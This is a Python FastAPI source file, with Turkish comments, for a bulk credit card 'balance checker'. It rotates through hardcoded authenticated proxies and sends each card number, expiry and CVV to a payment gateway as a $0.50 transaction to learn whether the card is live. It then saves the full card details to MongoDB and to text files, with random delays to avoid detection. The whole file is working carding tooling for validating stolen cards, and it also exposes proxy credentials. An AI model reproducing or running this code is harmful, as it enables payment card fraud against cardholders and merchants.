from fastapi import FastAPI, UploadFile, File
from pydantic import BaseModel
import requests, re, time, random, itertools, os
from typing import List
from datetime import datetime
from pymongo import MongoClient

app = FastAPI(title="Bulk Balance Checker + MongoDB")

# ================== MONGO DB BAĞLANTISI ==================
MONGODB_URI = "mongodb+srv://paymentmanger.gvaavzc.mongodb.net/?authSource=%24external&authMechanism=MONGODB-X509&appName=paymentmanger"

try:
    client = MongoClient(MONGODB_URI, tls=True, tlsAllowInvalidCertificates=True)
    db = client["paymentmanger"]                    # Database adı
    collection = db["checkbalance"]                 # Collection (tablo) adı
    print("[+] MongoDB bağlantısı başarılı")
except Exception as e:
    print(f"[!] MongoDB bağlantı hatası: {e}")
    collection = None

# ================== PROXY ROTASYONU ==================
proxies = [
    "http://akifdemi55574:llfg52end4@192.158.235.162:21250",
    "http://akifdemi55574:llfg52end4@160.202.94.136:21323",
    "http://akifdemi55574:llfg52end4@104.143.228.9:21320",
    "http://akifdemi55574:llfg52end4@179.61.252.53:21308",
    "http://akifdemi55574:llfg52end4@191.96.30.51:21276"
]

proxy_cycle = itertools.cycle(proxies)

def extract_balance(text: str):
    patterns = [r'remaining balance.*?\$?(\d+\.?\d*)', r'balance[:\s$]*?(\d+\.?\d*)',
                r'available.*?\$?(\d+\.?\d*)', r'\$?(\d{1,4}\.\d{2})']
    for pattern in patterns:
        match = re.search(pattern, text.lower())
        if match:
            return match.group(1)
    return "0.00"

def save_to_mongodb(card: str, balance: str, status: int):
    if collection is None:
        return
    
    cc = card.split("|")
    if len(cc) < 4:
        return
    
    try:
        data = {
            "cardnumber": cc[0],
            "expMonth": int(cc[1]),
            "expYear": int(cc[2]),
            "cvv": cc[3],
            "balance": balance,
            "status": status,                     # 1 = live, 0 = dead
            "timestamp": datetime.utcnow()
        }
        collection.insert_one(data)
    except Exception as e:
        print(f"[!] MongoDB yazma hatası: {e}")

def check_single(card: str):
    proxy = next(proxy_cycle)
    cc = card.split("|")
    if len(cc) < 4:
        return {"card": card, "status": "error", "msg": "Format hatalı"}

    number, month, year, cvv = [x.strip() for x in cc[:4]]

    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
    payload = {"card_number": number, "card_exp_month": month, "card_exp_year": year, "card_cvv": cvv, "amount": "0.50"}

    for _ in range(2):
        try:
            r = requests.post("https://secure.payadultgateway.com/transaction", 
                              headers=headers, data=payload, proxies={"https": proxy}, timeout=15)
            balance_str = extract_balance(r.text)
            
            if balance_str and balance_str != "0.00":
                save_to_mongodb(card, balance_str, 1)
                with open("live_with_balance.txt", "a", encoding="utf-8") as f:
                    f.write(f"{card} | Balance: ${balance_str}\n")
                return {"card": card, "status": "live", "balance": f"${balance_str}"}
        except:
            time.sleep(2)
            continue

    save_to_mongodb(card, "0.00", 0)
    with open("dead.txt", "a", encoding="utf-8") as f:
        f.write(f"{card}\n")
    return {"card": card, "status": "dead"}

# ================== BULK ENDPOINT ==================
@app.post("/bulkcheck")
async def bulk_check(cards: List[str]):
    results = []
    for card in cards:
        if card.strip():
            result = check_single(card.strip())
            results.append(result)
            time.sleep(random.uniform(1.8, 3.2))
    
    live_count = len([x for x in results if x.get("status") == "live"])
    return {
        "total": len(results), 
        "live": live_count, 
        "message": "İşlem tamamlandı ve MongoDB'ye kaydedildi.",
        "results": results
    }

@app.post("/bulkcheck/file")
async def bulk_from_file(file: UploadFile = File(...)):
    content = await file.read()
    cards = content.decode("utf-8").splitlines()
    return await bulk_check(cards)

@app.get("/")
async def home():
    return {"status": "API is running - MongoDB Integrated"}
